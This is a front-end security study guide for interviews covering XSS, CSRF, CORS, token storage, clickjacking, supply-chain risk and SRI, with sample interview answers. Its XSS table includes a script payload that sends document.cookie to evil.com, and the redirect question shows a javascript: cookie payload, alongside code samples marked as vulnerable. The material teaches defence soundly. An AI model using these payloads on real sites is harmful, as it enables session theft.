---
title: Frontend Security
description: XSS types and defences, CSRF and SameSite cookies, how CORS actually works, token storage trade-offs, clickjacking and supply chain risk
difficulty: Advanced
tags: [security, xss, csrf, cors]
---

Front-end security questions test whether you understand *why* a defence works, not just its name — interviewers routinely ask "what does CORS actually protect against" and most candidates get it backwards. This page covers the defences that come up most in senior interviews, with the mechanism behind each one.

## XSS: stored, reflected, DOM-based

Cross-Site Scripting means an attacker gets **their JavaScript to execute in another user's browser**, in the context of your site — able to read cookies (unless `httpOnly`), make authenticated requests, or modify the page.

| Type | How it happens | Example |
|---|---|---|
| **Stored** | Malicious input is saved server-side and served to other users later | A comment field stores `<script>fetch('https://evil.com?c='+document.cookie)</script>`, rendered unescaped for every viewer |
| **Reflected** | Malicious input is echoed back in the immediate response, usually via a URL parameter | A search page renders `?q=<script>...</script>` directly into the results HTML |
| **DOM-based** | The vulnerability is entirely client-side — JS takes untrusted input and writes it into the DOM unsafely | `element.innerHTML = location.hash.slice(1)` executed with attacker-controlled URL fragment |

```typescript
// Vulnerable: raw HTML injection from user input
function Comment({ text }: { text: string }) {
  return <div dangerouslySetInnerHTML={{ __html: text }} />; // parses attacker-controlled markup as HTML
}

// Safe: React escapes text content by default
function Comment({ text }: { text: string }) {
  return <div>{text}</div>; // rendered as text, not parsed as HTML
}
```

> [!DANGER]
> `dangerouslySetInnerHTML` is named that way on purpose. If you must render user-supplied HTML (a rich text field), sanitise it server-side and client-side with a library like DOMPurify — never trust that "we validate on the way in" is enough on its own.

**Defences, layered:**

| Defence | What it does |
|---|---|
| **Contextual output encoding** | Escape data differently depending on where it's inserted — HTML body, HTML attribute, URL, JS string — a single "escape everything the same way" approach misses attribute/JS-context injections |
| **Avoid `dangerouslySetInnerHTML`/`innerHTML`** | Frameworks escape text content by default; bypassing that removes the built-in protection |
| **Sanitisation** | For genuinely-needed rich HTML, strip dangerous tags/attributes (`<script>`, `onerror=`, `javascript:` URLs) with a maintained library, not a hand-rolled regex |
| **Content Security Policy (CSP)** | An HTTP header restricting which script sources the browser will execute, e.g. `script-src 'self'` blocks inline scripts and third-party script injection even if an XSS payload gets into the page |

> [!KEY]
> CSP is defence in depth, not a replacement for proper encoding — treat it as the safety net that limits blast radius if an XSS bug slips through, not the primary defence.

## CSRF and SameSite cookies

Cross-Site Request Forgery tricks a logged-in user's browser into sending an authenticated request to your site from an attacker's page — the browser automatically attaches cookies to requests regardless of which site initiated them, so a hidden form or image tag on `evil.com` can trigger `POST yourbank.com/transfer` and the browser happily attaches the victim's session cookie.

**Why `SameSite` cookies matter:** the `SameSite` attribute tells the browser *not* to send a cookie on cross-site requests.

| `SameSite` value | Behaviour |
|---|---|
| `Strict` | Cookie never sent on cross-site requests, even top-level navigation from a link |
| `Lax` (default in modern browsers) | Cookie sent on top-level navigations (clicking a link) but not on cross-site subrequests (forms, fetch, images) |
| `None` | Cookie sent on all requests — requires `Secure` (HTTPS only) |

`SameSite=Lax` alone blocks most CSRF vectors (cross-site POST via form/fetch), but a **CSRF token** (a random value embedded in the page and required on state-changing requests, checked server-side) is the stronger, defence-in-depth answer, because it doesn't rely purely on cookie behaviour and covers cases where `SameSite` can't (e.g., some legitimate cross-site integrations that need `SameSite=None`).

## CORS explained properly

**The single most misunderstood security mechanism.** CORS is a *browser-enforced* relaxation of the Same-Origin Policy — it protects **the user**, by controlling whether **JavaScript running on one origin can read the response** of a request to a different origin. It does **not** stop the request from being sent, and it does **not** protect the server — a server without CORS headers still receives and processes cross-origin requests; the browser just blocks the *calling page's script* from reading the response.

```mermaid
sequenceDiagram
    participant Evil as "evil.com page"
    participant Browser
    participant API as "api.example.com"
    Evil->>Browser: fetch("https://api.example.com/data")
    Browser->>API: Actual request IS sent
    API-->>Browser: Response (no Access-Control-Allow-Origin for evil.com)
    Browser-->>Evil: Response BLOCKED from JS — script cannot read it
    Note over Browser,API: Server already processed the request<br/>CORS only blocked the browser from returning the response to evil.com's JS
```

**Preflight**: for "non-simple" requests (custom headers, methods like `PUT`/`DELETE`, `Content-Type: application/json`), the browser sends an `OPTIONS` request first, asking the server which origins/methods/headers are allowed, before sending the actual request. **Credentials**: cookies are not sent on cross-origin requests unless the request explicitly opts in (`credentials: "include"`) *and* the server responds with `Access-Control-Allow-Credentials: true` and a specific (not wildcard) `Access-Control-Allow-Origin`.

> [!WARNING]
> CORS is not a security boundary for the server — an API that needs to reject unauthorized requests must do so with real authentication/authorization, not by relying on CORS headers. CORS only stops a *browser* from letting a *page's JS* read a response; a non-browser client (curl, a server-to-server call, Postman) is entirely unaffected by CORS.

## Token storage: localStorage vs memory vs httpOnly cookie

| Storage | Vulnerable to XSS reading it | Vulnerable to CSRF | Survives page reload | Sent automatically on requests |
|---|---|---|---|---|
| `localStorage` | Yes — any script on the page can read it | No (not auto-sent) | Yes | No — must be attached manually |
| In-memory (JS variable) | Only if XSS runs *while* it's in memory | No | No — lost on reload | No — must be attached manually |
| `httpOnly` cookie | No — inaccessible to JS entirely | Yes — sent automatically, needs `SameSite`/CSRF token | Yes | Yes — automatically by the browser |

> [!TIP]
> There's no free lunch: `httpOnly` cookies close off XSS token theft but open the door to CSRF (mitigated with `SameSite` + tokens); `localStorage`/memory avoid CSRF but are fully readable by any injected script if an XSS bug exists. The senior answer names both trade-offs rather than declaring one storage method universally "secure".

A common production pattern: short-lived access token in memory (gone on reload, minimal XSS exposure window), refresh token in an `httpOnly`, `Secure`, `SameSite=Strict` cookie (inaccessible to JS, protected from CSRF by SameSite).

## Clickjacking and frame options

Clickjacking overlays an invisible iframe of your site over a decoy page, tricking the user into clicking something (e.g., "Delete account") they can see and interact with on the decoy but that actually clicks through to your real, invisibly-framed page. Defence: the `X-Frame-Options: DENY` (or `SAMEORIGIN`) header, or the more flexible `Content-Security-Policy: frame-ancestors 'self'`, tells the browser to refuse to render the page inside a frame on another origin at all.

## Dependency supply chain risk

Every npm package (and its transitive dependencies) is code you're trusting to run in your build or your users' browsers. A compromised or malicious package (typosquatting a popular name, or a legitimate package taken over and given a malicious update) can exfiltrate secrets, inject skimmers, or backdoor a build. Mitigations: lockfiles (`package-lock.json`) pinned to exact versions, automated vulnerability scanning (`npm audit`, Dependabot/Snyk), reviewing new dependencies before adding them, and minimising dependency count for anything touching sensitive data paths.

## Secrets never belong in the client, and Subresource Integrity

Anything shipped to the browser — including environment variables baked into a client JS bundle at build time — is **visible to anyone who opens DevTools**. API keys, signing secrets, or database credentials must never be embedded in front-end code; they belong behind a backend that the client calls, with the backend holding the secret.

**Subresource Integrity (SRI)** lets you pin a hash of an external script/stylesheet so the browser refuses to execute it if the file's content doesn't match — protecting against a compromised CDN silently serving modified content for a third-party script you load directly.

```html
<script src="https://cdn.example.com/lib.js"
        integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
        crossorigin="anonymous"></script>
```

## Cheat sheet

- XSS = attacker JS running in your page's context. Encode by context, avoid `dangerouslySetInnerHTML`/`innerHTML`, sanitise real HTML input, add CSP as defence in depth.
- CSRF exploits automatic cookie attachment on cross-site requests — `SameSite=Lax/Strict` plus a CSRF token is the layered defence.
- CORS protects the *user*, enforced by the *browser* — it does not stop the request from reaching the server, and it is not a server-side security boundary.
- Preflight (`OPTIONS`) happens for non-simple cross-origin requests; credentials require explicit opt-in on both client and server.
- Token storage is a trade-off: `httpOnly` cookies block XSS theft but need CSRF defence; `localStorage`/memory avoid CSRF but are fully exposed to any XSS.
- Clickjacking is stopped with `X-Frame-Options`/`frame-ancestors` CSP directive.
- Treat every dependency as trusted code execution — lockfiles, scanning, and minimal footprint for sensitive paths.
- Never ship secrets to the client — anything in the bundle is visible in DevTools.
- SRI hashes pin third-party script/stylesheet content so a compromised CDN can't silently swap in malicious code.

## Common mistakes

| Mistake | Fix |
|---|---|
| Using `dangerouslySetInnerHTML` on unsanitised user input | Sanitise with DOMPurify, or avoid rendering raw HTML at all |
| Believing CORS protects the server from unauthorized requests | Enforce real auth/authorization server-side; CORS only affects browser JS reading the response |
| Storing an access token in `localStorage` and calling it "secure" | Recognise the XSS trade-off explicitly; prefer memory + httpOnly refresh cookie for sensitive apps |
| Relying only on `SameSite=Lax` with no CSRF token for a sensitive action | Add a CSRF token for state-changing requests as defence in depth |
| Embedding an API key in front-end JS "because it's just a public build" | Anything in the client bundle is fully visible; proxy the call through a backend |
| Adding a new npm dependency without checking its maintenance/popularity | Review before adding; prefer well-maintained, widely-used packages; run `npm audit` |

## Summary

Front-end security is mostly about not trusting anything that crosses a trust boundary: user input can carry script (XSS), a browser will auto-attach cookies to requests it didn't intend (CSRF), and code loaded from anywhere — a dependency, a CDN script, a client bundle — runs with the page's full privileges. CORS is a browser-enforced, user-protecting mechanism, not a server access-control list, and token storage is always a trade-off between XSS and CSRF exposure rather than a single "secure" answer. Layering defences — contextual encoding, CSP, SameSite plus CSRF tokens, SRI, and keeping secrets server-side — is what actually holds up under attack.

## Top Interview Questions

### Q1. What is the difference between stored, reflected, and DOM-based XSS?

Stored XSS happens when malicious script is saved on the server (in a database, a comment, a profile field) and then served to other users whenever that data is displayed, making it the most dangerous variant since it affects every visitor without any special action from the attacker per victim. Reflected XSS happens when the malicious payload is part of the request itself (typically a URL query parameter) and the server immediately echoes it back into the response HTML unescaped — it requires tricking a victim into clicking a crafted link. DOM-based XSS is different from both in that the vulnerability never touches the server at all — client-side JavaScript reads untrusted data (like `location.hash` or `document.referrer`) and writes it directly into the DOM via `innerHTML` or similar, so the entire attack and defence surface is client-side code. All three result in the same outcome — attacker script executing in the victim's browser under your origin — but they differ in where the untrusted data enters and where the vulnerable code lives.

### Q2. Why is dangerouslySetInnerHTML dangerous, and how would you safely render user-generated rich text?

React escapes all text content by default when you render `{value}` inside JSX, converting any HTML-significant characters so they display as text rather than being parsed as markup — this is what prevents most XSS by default. `dangerouslySetInnerHTML` explicitly opts out of that protection and tells React to parse the given string as raw HTML and insert it into the DOM. Script tags inserted this way are not reliably executed by browsers, but that is not a defence: event handler attributes, dangerous URL schemes, unsafe SVG/HTML and sanitizer bypasses can still run attacker-controlled code. To safely render genuinely-needed rich text (a blog post editor, formatted comments), the content must be sanitised through a maintained library like DOMPurify that strips dangerous tags/attributes/URL schemes, ideally both on the way in (server-side, before storage) and on the way out (client-side, before rendering) as defence in depth — never trust a single sanitisation pass, and never write a custom regex-based sanitiser, since HTML/JS injection has many non-obvious bypasses.

### Q3. Explain what CORS actually protects against, and what a common misconception about it is.

CORS is a browser-enforced relaxation of the Same-Origin Policy that controls whether JavaScript running on one origin is allowed to *read the response* of a cross-origin request — it protects the user by preventing a malicious page from silently reading data from another site the user is authenticated to (e.g., reading your bank balance via a background fetch while you're logged in). The common misconception is that CORS prevents the cross-origin request from being sent or processed at all — it does not. The actual HTTP request typically still reaches the server and the server still executes it; CORS only controls whether the *browser hands the response back to the calling page's script*. This means CORS is not a server-side access control mechanism — a server that wants to reject unauthorized requests must use real authentication and authorization, and non-browser clients (curl, server-to-server calls, mobile apps) are entirely unaffected by CORS since it's enforced by the browser, not the server.

### Q4. What triggers a CORS preflight request, and what does the server need to respond with?

A preflight (`OPTIONS`) request is sent automatically by the browser before a "non-simple" cross-origin request — one using a method other than `GET`/`HEAD`/`POST`, using a `Content-Type` other than form-encoded/plain-text/multipart, or including custom headers (like an `Authorization` header or a custom `X-` header). The preflight asks the server, via `Access-Control-Request-Method` and `Access-Control-Request-Headers`, whether the actual request would be allowed; the server must respond with matching `Access-Control-Allow-Methods`, `Access-Control-Allow-Headers`, and `Access-Control-Allow-Origin` (a specific origin, not `*`, if credentials are involved) for the browser to proceed with the real request. If credentials (cookies) need to be sent cross-origin, the client must set `credentials: "include"` and the server must respond with `Access-Control-Allow-Credentials: true` alongside a non-wildcard origin — both sides must explicitly opt in.

### Q5. How does SameSite=Lax mitigate CSRF, and why isn't it a complete solution on its own?

`SameSite=Lax` tells the browser not to attach the cookie to cross-site *subrequests* — forms submitted via JS, `fetch`/`XHR` calls, image/iframe loads initiated from another origin — while still allowing it on top-level navigations like clicking a link, which covers the majority of classic CSRF attack vectors (a hidden auto-submitting form on an attacker's page targeting a state-changing endpoint). It isn't complete on its own because: some legitimate cross-site use cases require `SameSite=None` (third-party embeds, some SSO flows), which reopens the cookie-attachment vector and needs a different defence there; older browsers may not respect `SameSite` at all; and a GET-based state-changing endpoint (a design mistake, but they exist) could still be triggered via a top-level navigation, which `Lax` allows. A CSRF token — a value embedded in the page, sent back with state-changing requests and validated server-side against the session — provides defence that doesn't depend purely on cookie/browser behaviour, and combining both is the standard defence-in-depth recommendation.

### Q6. Compare storing an auth token in localStorage versus an httpOnly cookie. Which would you pick and why?

`localStorage` is readable by any JavaScript running on the page, so if the site has *any* XSS vulnerability anywhere, an attacker's injected script can read the token directly and exfiltrate it — the token is not protected by same-origin restrictions once script execution is achieved. An `httpOnly` cookie is inaccessible to JavaScript entirely, so an XSS bug cannot read the token itself (though it could still ride along by making authenticated requests through the browser while the XSS runs), but because the browser auto-attaches cookies to matching-domain requests, it reopens CSRF exposure, which must be mitigated with `SameSite` plus a CSRF token. My default for anything handling sensitive actions: keep a short-lived access token in memory (not in any persistent storage, minimising the XSS exposure window since a reload clears it) and use an `httpOnly`, `Secure`, `SameSite=Strict` cookie for the longer-lived refresh token, combining minimal XSS blast radius with CSRF-safe refresh handling — while being explicit that this is a trade-off, not an absolute "secure" choice, and that preventing XSS in the first place is still the primary defence either way.

### Q7. What is Content Security Policy, and how does it help even if an XSS bug already exists?

CSP is an HTTP response header (`Content-Security-Policy`) that tells the browser which sources of scripts, styles, images, frames, and other resources are allowed to load or execute on the page — for example, `script-src 'self'` permits only scripts served from the page's own origin and blocks inline `<script>` tags and scripts from any third-party domain. Its value as defence in depth is that even if an attacker manages to inject an XSS payload (say, through a field that wasn't properly encoded), a strict CSP can prevent that injected script from actually executing — an inline `<script>alert(1)</script>` is blocked outright, and a payload trying to load a script from `evil.com` is blocked because that origin isn't in the allow-list. CSP is not a substitute for fixing the underlying injection — it's a safety net that limits the blast radius when encoding/sanitisation fails somewhere, which is why it's recommended alongside, not instead of, proper output encoding.

### Q8. Describe how clickjacking works and how you would prevent it on a page with a sensitive action like "delete account".

An attacker builds a decoy page with an enticing UI element (e.g., a "claim your prize" button) and overlays your real page inside an invisible or near-invisible `<iframe>`, positioned so that the real page's sensitive button (e.g., "Delete account", already logged in via the victim's existing session/cookies) sits exactly under the decoy button the user sees and intends to click. The victim believes they're clicking the harmless decoy but their click actually lands on your framed, real page's button, triggering the sensitive action without their awareness. The defence is to tell the browser not to allow your page to be rendered inside a frame on another origin at all, via the `X-Frame-Options: DENY` (or `SAMEORIGIN` if legitimate same-origin framing is needed) header, or more flexibly via `Content-Security-Policy: frame-ancestors 'self'`, which additionally supports allowing specific trusted origins if needed — either header, sent by the server, causes the browser to refuse to render the page inside a disallowed frame.

### Q9. Your team wants to add a small third-party analytics script loaded from a CDN. What security considerations would you raise?

First, the script runs with the full privileges of your page — it can read cookies (if not httpOnly), access the DOM, and make requests as if it were your own code, so a compromised or malicious version of that script is effectively a first-party XSS vulnerability; I'd want Subresource Integrity (an `integrity` hash attribute) on the script tag so the browser refuses to execute it if the CDN ever serves modified content, whether from a compromise or a supply-chain attack. Second, I'd check what data the script can access and whether it should be restricted via CSP (`script-src` allow-listing only the specific CDN origin, not a broad wildcard). Third, I'd evaluate the vendor's security track record and whether the script is versioned/pinned rather than always pulling `@latest`, since an unpinned script means the vendor (or anyone who compromises their account) can push new code that runs on your site at any time without your team reviewing it.

### Q10. A code reviewer flags that a new feature builds an API URL by directly concatenating a user-supplied redirect parameter, then performs `window.location = url`. What's the risk, and how would you fix it?

The risk is an open redirect combined potentially with a JavaScript URL injection — if the user-supplied value isn't validated, an attacker can craft a link like `yoursite.com/login?redirect=javascript:alert(document.cookie)` or `redirect=//evil.com`, and if that value is assigned directly to `window.location`, the browser will either execute the `javascript:` URL in the page's context (effectively XSS) or silently redirect the user to an attacker-controlled look-alike site after what looked like a legitimate action on your domain (useful for phishing, since the initial URL was genuinely your trusted domain). The fix is to validate that the redirect target is a relative path or matches an explicit allow-list of trusted origins before using it, reject any `javascript:`/`data:` scheme outright, and prefer parsing the URL with the platform's URL API to check its scheme and origin rather than a naive string check (which can be bypassed with encoding tricks or unusual protocol-relative formats).
